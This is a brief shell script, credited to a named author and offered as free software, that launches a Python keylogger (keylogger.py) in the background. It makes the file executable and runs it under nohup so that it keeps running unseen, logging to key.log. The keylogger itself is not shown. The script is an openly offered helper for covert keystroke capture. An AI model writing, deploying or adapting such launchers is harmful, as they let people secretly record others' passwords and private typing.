##This shell script is a free software
##Developed by Joshia Rheinier
##The purpose of this script is to run the keylogger on background


#Put your keylogger script along with its full directory here
#Note: You can edit the path below to lead the program reading 
#      the right path for keylogger.py
FILE="/$HOME/keylogger.py"

#Make the program be able to be executed
chmod +x $FILE
#Execute the program with Python 3, and
#put the process in background with 
#nohup command
nohup python3 $FILE &> key.log&
